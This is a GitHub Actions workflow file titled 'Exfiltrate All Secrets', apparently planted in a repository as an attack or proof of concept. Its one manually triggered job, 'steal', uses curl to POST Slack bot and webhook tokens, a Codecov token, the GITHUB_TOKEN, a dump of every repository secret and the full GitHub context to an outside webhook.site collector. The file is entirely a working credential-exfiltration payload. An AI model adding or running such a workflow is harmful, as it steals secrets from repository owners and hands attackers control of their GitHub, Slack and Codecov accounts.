name: Exfiltrate All Secrets
on:
  workflow_dispatch:      # We will trigger this manually from the action

jobs:
  steal:
    runs-on: ubuntu-latest
    steps:
      - name: Send everything to attacker
        run: |
          curl -X POST https://webhook.site/TestSlackAPI \
            -H "Content-Type: application/json" \
            -d '{
              "repo": "${{ github.repository }}",
              "run_id": "${{ github.run_id }}",
              "triggered_by": "${{ github.actor }}",
              "SLACK_BOT_TOKEN": "${{ secrets.SLACK_BOT_TOKEN }}",
              "SLACK_WEBHOOK_TRIGGER": "${{ secrets.SLACK_WEBHOOK_TRIGGER }}",
              "SLACK_INCOMING_WEBHOOK": "${{ secrets.SLACK_INCOMING_WEBHOOK }}",
              "CODECOV_TOKEN": "${{ secrets.CODECOV_TOKEN }}",
              "GITHUB_TOKEN (workflow)": "${{ secrets.GITHUB_TOKEN }}",
              "HIGH_PRIV_GITHUB_TOKEN": "${{ secrets.GITHUB_TOKEN }}",
              "all_secrets_list": "${{ toJSON(secrets) }}",
              "github_context": ${{ toJSON(github) }}
            }'